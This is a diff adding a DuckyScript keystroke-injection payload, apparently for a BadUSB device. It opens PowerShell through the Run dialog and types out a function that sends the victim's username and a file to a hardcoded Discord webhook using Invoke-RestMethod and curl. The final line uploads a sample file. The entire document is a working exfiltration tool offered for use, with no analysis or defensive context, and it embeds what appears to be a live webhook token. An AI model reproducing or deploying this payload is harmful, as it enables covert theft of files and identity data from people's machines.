@@ -1,0 +1,48 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING function Upload-Discord {
+SHIFT ENTER
+SHIFT ENTER
+STRING [CmdletBinding()]
+SHIFT ENTER
+STRING param (
+SHIFT ENTER
+STRING     [parameter(Position=0,Mandatory=$False)]
+SHIFT ENTER
+STRING     [string]$file,
+SHIFT ENTER
+STRING     [parameter(Position=1,Mandatory=$False)]
+SHIFT ENTER
+STRING     [string]$text 
+SHIFT ENTER
+STRING )
+SHIFT ENTER
+SHIFT ENTER
+STRING $hookurl = 'https://discord.com/api/webhooks/1166953664288657428/QyQSC3hHtAPpQPasvGXm17G0oHN8l4MOLDaLquDNKyaYDceGfoRe8Y1F7DGreij4QvK_'
+SHIFT ENTER
+SHIFT ENTER
+STRING $Body = @{
+SHIFT ENTER
+STRING   'username' = $env:username
+SHIFT ENTER
+STRING   'content' = $text
+SHIFT ENTER
+STRING }
+SHIFT ENTER
+SHIFT ENTER
+STRING if (-not ([string]::IsNullOrEmpty($text))){
+SHIFT ENTER
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+SHIFT ENTER
+SHIFT ENTER
+STRING if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+SHIFT ENTER
+STRING }
+ENTER
+
+
+Upload-Discord -file "file.txt" -text "test"
+ENTER
